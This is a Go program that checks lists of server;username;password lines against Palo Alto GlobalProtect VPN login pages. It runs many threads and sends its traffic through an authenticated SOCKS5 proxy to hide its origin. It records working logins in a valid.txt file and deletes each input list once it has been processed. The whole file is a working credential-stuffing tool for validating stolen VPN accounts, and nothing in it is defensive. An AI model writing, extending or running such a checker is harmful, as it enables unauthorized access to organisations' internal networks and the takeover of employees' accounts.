//go:build ignore

package main

import (
	"bufio"
	"context"
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"

	"golang.org/x/net/proxy"
)

var (
	threads     int
	filedirk    = "/root/NAM/Check"
	validdir    = "/root/NAM/Servis"
	validFile   = validdir + "/valid.txt"
	proxyConfig = validdir + "/proxy_config.txt"
)

func main() {
	// Read config
	threads = readConfig("config.txt")
	if threads <= 0 {
		fmt.Println("[Global-Protect] Invalid number of threads specified in config.txt.")
		return
	}

	fmt.Printf("[Global-Protect] Using %d threads.\n", threads)

	// Create directories if not exist
	os.MkdirAll(filedirk, os.ModePerm)
	os.MkdirAll(validdir, os.ModePerm)

	// Read proxy config
	proxyInfo, err := readProxyConfig(proxyConfig)
	if err != nil {
		fmt.Println("[Global-Protect] Error reading proxy config:", err)
		return
	}
	fmt.Printf("[Global-Protect] Proxy info: %s\n", proxyInfo)

	// List files in directory
	files, err := ioutil.ReadDir(filedirk)
	if err != nil {
		fmt.Println("[Global-Protect] Error reading directory:", err)
		return
	}

	// Channel for file paths
	fileChan := make(chan string, len(files))

	// WaitGroup to wait for all workers to finish
	var wg sync.WaitGroup

	// Map to keep track of processed lines
	processedLines := make(map[string]bool)
	var mu sync.Mutex

	// Start workers
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go worker(proxyInfo, fileChan, validFile, processedLines, &mu, &wg)
	}

	// Enqueue files
	for _, file := range files {
		if strings.HasSuffix(file.Name(), ".txt") {
			fileChan <- filedirk + "/" + file.Name()
		}
	}

	// Close the channel and wait for all workers to finish
	close(fileChan)
	wg.Wait()
}

func readConfig(filePath string) int {
	file, err := os.Open(filePath)
	if err != nil {
		fmt.Println("[Global-Protect] Error reading config file:", err)
		return 0
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		if strings.HasPrefix(line, "threads") {
			var threads int
			if _, err := fmt.Sscanf(line, "threads=%d", &threads); err == nil {
				return threads
			} else {
				fmt.Println("[Global-Protect] Error parsing threads from config file:", err)
			}
		}
	}

	if err := scanner.Err(); err != nil {
		fmt.Println("[Global-Protect] Error reading config file:", err)
	}
	return 0
}

func readProxyConfig(filePath string) (string, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return "", err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	if scanner.Scan() {
		return scanner.Text(), nil
	}
	return "", scanner.Err()
}

func worker(proxyInfo string, fileChan chan string, validFilePath string, processedLines map[string]bool, mu *sync.Mutex, wg *sync.WaitGroup) {
	defer wg.Done()

	for filePath := range fileChan {
		processFile(proxyInfo, filePath, validFilePath, processedLines, mu)
	}
}

func processFile(proxyInfo, filePath, validFilePath string, processedLines map[string]bool, mu *sync.Mutex) {
	parts := strings.Split(proxyInfo, ":")
	if len(parts) != 4 {
		fmt.Printf("[Global-Protect] Invalid proxy format: %s\n", proxyInfo)
		return
	}
	host, port, username, password := parts[0], parts[1], parts[2], parts[3]
	proxyURL := fmt.Sprintf("%s:%s", host, port)

	auth := &proxy.Auth{
		User:     username,
		Password: password,
	}

	dialer, err := proxy.SOCKS5("tcp", proxyURL, auth, proxy.Direct)
	if err != nil {
		fmt.Printf("[Global-Protect] Error creating SOCKS5 dialer: %v\n", err)
		return
	}

	httpTransport := &http.Transport{}
	httpTransport.DialContext = func(ctx context.Context, network, addr string) (net.Conn, error) {
		return dialer.Dial(network, addr)
	}

	client := &http.Client{
		Transport: httpTransport,
		Timeout:   10 * time.Second,
	}

	if !checkProxy(client) {
		fmt.Println("[Global-Protect] Skipping file processing due to proxy check failure.")
		return
	}

	file, err := os.Open(filePath)
	if err != nil {
		fmt.Printf("[Global-Protect] Error opening file %s: %v\n", filePath, err)
		return
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		mu.Lock()
		if _, exists := processedLines[line]; exists {
			mu.Unlock()
			continue
		}
		processedLines[line] = true
		mu.Unlock()

		parts := strings.Split(line, ";")
		if len(parts) == 3 {
			server := parts[0]
			username := parts[1]
			password := parts[2]
			url := fmt.Sprintf("https://%s/global-protect/login.esp", server)
			data := fmt.Sprintf("prot=https%%&server=%s&inputStr=&action=getsoftware&user=%s&passwd=%s&new-passwd=&confirm-new-passwd=&ok=Log+In", server, username, password)

			if checkHost(client, url, data, line, validFilePath) {
				appendToFile(validFilePath, line)
			}
		}
	}

	if err := os.Remove(filePath); err != nil {
		fmt.Printf("[Global-Protect] Error removing file %s: %v\n", filePath, err)
	} else {
		fmt.Printf("[Global-Protect] File %s has been processed and removed.\n", filePath)
	}
}

func checkProxy(client *http.Client) bool {
	resp, err := client.Get("https://httpbin.org/ip")
	if err != nil {
		fmt.Printf("[Global-Protect] Proxy check failed: %v\n", err)
		return false
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 {
		fmt.Println("[Global-Protect] Proxy is valid.")
		return true
	}
	fmt.Printf("[Global-Protect] Proxy returned status %d.\n", resp.StatusCode)
	return false
}

func checkHost(client *http.Client, url, data, line, validFilePath string) bool {
	resp, err := client.Post(url, "application/x-www-form-urlencoded", strings.NewReader(data))
	if err != nil {
		fmt.Printf("[Global-Protect] Error checking %s: %v\n", line, err)
		return false
	}
	defer resp.Body.Close()

	bodyBytes, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Printf("[Global-Protect] Error reading response body for %s: %v\n", line, err)
		return false
	}

	if strings.Contains(string(bodyBytes), "Download Windows 64 bit GlobalProtect agent") {
		fmt.Printf("[Global-Protect] %s is valid\n", line)
		return true
	}
	fmt.Printf("[Global-Protect] %s is invalid\n", line)
	return false
}

func appendToFile(filePath, line string) {
	file, err := os.OpenFile(filePath, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
	if err != nil {
		fmt.Printf("[Global-Protect] Error opening file %s: %v\n", filePath, err)
		return
	}
	defer file.Close()

	if _, err = file.WriteString(line + "\n"); err != nil {
		fmt.Printf("[Global-Protect] Error writing to file %s: %v\n", filePath, err)
	}
}
